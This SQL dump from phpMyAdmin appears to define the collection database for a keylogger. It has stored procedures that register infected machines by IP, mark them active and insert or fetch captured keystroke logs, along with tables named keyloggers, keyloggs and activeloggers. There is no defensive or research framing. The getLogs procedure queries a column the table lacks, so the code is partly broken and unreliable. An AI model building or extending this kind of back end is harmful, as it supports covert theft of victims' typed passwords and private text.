-- phpMyAdmin SQL Dump
-- version 4.0.8
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Dec 03, 2016 at 11:30 PM
-- Server version: 5.7.14-log
-- PHP Version: 5.4.14

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `0211962669_loka`
--

DELIMITER $$
--
-- Procedures
--
CREATE DEFINER=`0211962669`@`%` PROCEDURE `addActive`(ip varchar(50))
BEGIN
	INSERT INTO activeloggers(ip) VALUES (ip);
END$$

CREATE DEFINER=`0211962669`@`%` PROCEDURE `addLog`(ip varchar(50), logger varchar(8000))
BEGIN
 INSERT INTO keyloggs(log, logger_ip) VALUES (logger, ip);
END$$

CREATE DEFINER=`0211962669`@`%` PROCEDURE `addLogger`(ip varchar(50))
BEGIN
 INSERT INTO keyloggers(ip) VALUES (ip);
 REPLACE INTO activeloggers(ip) VALUES (ip);
END$$

CREATE DEFINER=`0211962669`@`%` PROCEDURE `clearActive`()
BEGIN
 DELETE FROM activeloggers;
END$$

CREATE DEFINER=`0211962669`@`%` PROCEDURE `getActive`()
BEGIN
	SELECT * FROM activeLoggers;
END$$

CREATE DEFINER=`0211962669`@`%` PROCEDURE `getLoggers`()
BEGIN
 SELECT * FROM keyloggers;
END$$

CREATE DEFINER=`0211962669`@`%` PROCEDURE `getLogs`(ipin varchar(50))
BEGIN
 SELECT * FROM keyloggs WHERE ip = ipin;
END$$

DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `activeloggers`
--

CREATE TABLE IF NOT EXISTS `activeloggers` (
  `ip` varchar(50) NOT NULL,
  `connect_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `activeloggers`
--

INSERT INTO `activeloggers` (`ip`, `connect_date`) VALUES
('197.178.1.1', '2016-12-03 17:34:02');

-- --------------------------------------------------------

--
-- Table structure for table `keyloggers`
--

CREATE TABLE IF NOT EXISTS `keyloggers` (
  `ip` varchar(50) NOT NULL,
  `date_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `keyloggs`
--

CREATE TABLE IF NOT EXISTS `keyloggs` (
  `log_id` int(50) NOT NULL AUTO_INCREMENT,
  `log` varchar(8000) NOT NULL,
  `logger_ip` varchar(50) NOT NULL,
  `log_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`log_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
